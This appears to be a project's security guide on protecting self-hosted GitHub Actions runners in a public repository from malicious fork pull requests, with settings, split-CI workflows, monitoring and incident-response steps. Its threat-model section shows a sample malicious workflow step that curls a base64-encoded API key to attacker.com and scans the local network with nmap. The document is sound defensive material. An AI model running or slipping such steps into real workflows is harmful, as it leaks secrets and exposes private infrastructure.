# Self-Hosted Runner Security Setup for Public Repository

## Overview

This document explains how to safely use self-hosted GitHub runners in a public repository. This is **CRITICAL** for the security of your infrastructure.

## The Threat Model

### What Can Go Wrong

When a public repository uses self-hosted runners:

1. **Malicious PR from Forked Repo:**
   - Attacker forks your repo
   - Modifies workflow to run malicious code
   - Opens PR (which triggers workflows)
   - Code runs on YOUR self-hosted runner
   - Attacker gains access to:
     - Your network
     - TrueNAS server
     - GitHub Secrets
     - Runner filesystem
     - Anything else the runner can access

2. **Example Attack:**
   ```yaml
   # Malicious workflow modification
   - name: "Innocent looking step"
     run: |
       # Exfiltrate secrets
       curl https://attacker.com/?data=$(echo $TNS_API_KEY | base64)
       
       # Scan network
       nmap -sn 192.168.1.0/24
       
       # Access TrueNAS
       curl -k https://$TNS_URL/api/v2.0/pool/dataset
   ```

### Why This Matters for This Project

- Self-hosted runner has access to TrueNAS via Wireguard VPN
- CI/CD uses TrueNAS API keys stored in GitHub Secrets
- Runner is on your private network
- Compromise could affect your entire infrastructure

## Solution: Restrict Fork PR Workflows

### Step 1: Configure GitHub Repository Settings

1. Go to: **Settings → Actions → General**

2. Scroll to: **Fork pull request workflows from outside collaborators**

3. Choose ONE of these options:

   **Option A: Require approval for first-time contributors (Recommended)**
   - Select: "Require approval for first-time contributors who are new to GitHub"
   - Any new GitHub account must be approved before workflows run
   - Regular contributors don't need re-approval
   - **Best balance of security and convenience**

   **Option B: Require approval for all outside collaborators (Maximum Security)**
   - Select: "Require approval for all outside collaborators"
   - EVERY PR from non-collaborators requires manual approval
   - Most secure but requires more manual work
   - **Use this if you're paranoid (which is reasonable)**

4. Scroll to: **Fork pull request workflows in private repositories**
   - Select: "Require approval for all outside collaborators"
   - This ensures the setting persists if you ever make repo private again

5. Scroll to: **Workflow permissions**
   - Select: "Read repository contents and packages permissions"
   - Disable: "Allow GitHub Actions to create and approve pull requests"
   - This limits what workflows can do

### Step 2: Test the Configuration

1. **Create a test fork** (use a secondary GitHub account):
   ```bash
   # From the fork
   git checkout -b test-workflow-security
   
   # Add a harmless test
   echo "echo 'Testing workflow approval'" >> .github/workflows/ci.yml
   
   git commit -am "test: workflow security check"
   git push origin test-workflow-security
   ```

2. **Open a pull request** from the fork

3. **Verify approval is required:**
   - PR should show: "Workflow awaiting approval"
   - You must click "Approve and run" before workflows execute
   - ✅ This is what you want to see

4. **Test what happens after approval:**
   - Click "Approve and run"
   - Workflows should execute normally
   - Close the PR (don't merge)

### Step 3: Update Documentation

Add this warning to your README.md:

```markdown
## For Contributors

**Important:** This repository uses self-hosted runners for integration testing. 

- First-time contributors will need workflow approval from maintainers
- This is a security measure to protect our infrastructure
- Your PR will be reviewed before CI runs
- Once approved, subsequent PRs won't need re-approval
```

## Alternative Approach: Split Public and Private CI

If you want PRs to get immediate CI feedback without approval:

### Architecture

**Public CI Workflows (GitHub-hosted):**
- Run on all PRs automatically
- Use `runs-on: ubuntu-latest`
- Only run safe operations:
  - Linting
  - Unit tests (with mock TrueNAS client)
  - Build verification
  - Static security scanning

**Private Integration Workflows (self-hosted):**
- Only run on pushes to `main` branch
- Only run on manual workflow_dispatch
- Never run on fork PRs
- Full integration tests with real TrueNAS

### Implementation

1. **Create new workflow: `.github/workflows/public-ci.yml`**

```yaml
name: Public CI

on:
  pull_request:
    branches: [ main ]
  push:
    branches: [ main ]

jobs:
  lint:
    name: Lint
    runs-on: ubuntu-latest  # GitHub-hosted
    steps:
      - uses: actions/checkout@v5
      
      - name: Set up Go
        uses: actions/setup-go@v6
        with:
          go-version: '1.25'
      
      - name: golangci-lint
        uses: golangci/golangci-lint-action@v8
        with:
          version: latest

  test:
    name: Unit Tests
    runs-on: ubuntu-latest  # GitHub-hosted
    steps:
      - uses: actions/checkout@v5
      
      - name: Set up Go
        uses: actions/setup-go@v6
        with:
          go-version: '1.25'
      
      - name: Run tests
        run: go test -v ./...
```

2. **Update integration workflow: `.github/workflows/integration.yml`**

```yaml
name: Integration Tests

on:
  push:
    branches: [ main ]  # Only on main branch pushes
  workflow_dispatch:     # Manual trigger only

jobs:
  integration-nfs:
    name: NFS Integration Tests
    runs-on: self-hosted  # Your runner
    # ... rest of your integration tests
```

3. **Update existing workflows** to only run on main:

```yaml
on:
  push:
    branches: [ main ]
  workflow_dispatch:
  # Remove 'pull_request:' trigger for self-hosted workflows
```

### Benefits of Split Approach

✅ PRs get immediate CI feedback (lint, unit tests)  
✅ No waiting for maintainer approval  
✅ Self-hosted runner never executes untrusted code  
✅ Full integration tests still run before release  
✅ Better contributor experience  

### Drawbacks

⚠️ PRs don't run integration tests  
⚠️ Bugs may not be caught until after merge  
⚠️ More complex workflow setup  

## Monitoring and Audit

### What to Monitor

1. **Check runner logs regularly:**
   ```bash
   # On your runner machine
   tail -f /path/to/runner/_diag/Runner_*.log
   ```

2. **Review workflow runs:**
   - Check for suspicious workflow modifications
   - Look for unexpected network activity
   - Monitor job execution times (unusually long = suspicious)

3. **TrueNAS audit logs:**
   - Enable API audit logging in TrueNAS
   - Review for unauthorized access attempts
   - Monitor dataset creation/deletion patterns

4. **Network monitoring:**
   - Monitor outbound connections from runner
   - Alert on unexpected destinations
   - Use firewall rules to limit runner access

### Security Checklist for Runner Machine

- [ ] Runner runs in isolated VM or container
- [ ] Minimal packages installed
- [ ] Firewall configured (only allow required traffic)
- [ ] Wireguard VPN only for TrueNAS access
- [ ] No direct internet access (proxy if needed)
- [ ] Regular security updates applied
- [ ] Logs sent to SIEM or log aggregator
- [ ] Separate GitHub token for runner (not admin token)
- [ ] Runner token rotated regularly

## Incident Response

### If You Suspect Compromise

1. **Immediate actions:**
   ```bash
   # Stop the runner
   sudo systemctl stop actions.runner.*
   
   # Make repository private
   # GitHub Settings → Danger Zone → Change visibility
   
   # Revoke runner token
   # GitHub Settings → Actions → Runners → Remove runner
   ```

2. **Rotate all credentials:**
   - TrueNAS API keys
   - GitHub Secrets
   - Runner registration token
   - Any other affected credentials

3. **Investigate:**
   - Review runner logs
   - Check TrueNAS access logs
   - Review all recent PRs and workflow runs
   - Check network logs for unusual traffic

4. **Recovery:**
   - Rebuild runner from clean image
   - Re-register with new token
   - Update all secrets
   - Review and tighten security controls

## Summary: Recommended Configuration

For this project, I recommend:

**✅ Use GitHub's fork PR approval feature**
- Easiest to implement
- Maintains current workflow structure
- Good security with minimal inconvenience
- Just requires clicking "Approve and run" for new contributors

**Settings to configure:**
1. Require approval for first-time contributors
2. Limit workflow permissions to read-only
3. Document the policy in CONTRIBUTING.md
4. Test with a fork before going public

**Do NOT:**
- ❌ Go public without configuring fork PR approvals
- ❌ Assume GitHub will protect you by default
- ❌ Skip testing the approval workflow
- ❌ Forget to document this for contributors

## Questions?

If you're unsure about any of this:
- Test in a fork first
- Start with stricter settings, relax later if needed
- When in doubt, keep repository private
- Consider starting without self-hosted runners until you're comfortable

**Remember:** It's easier to start strict and relax later than to recover from a compromise.
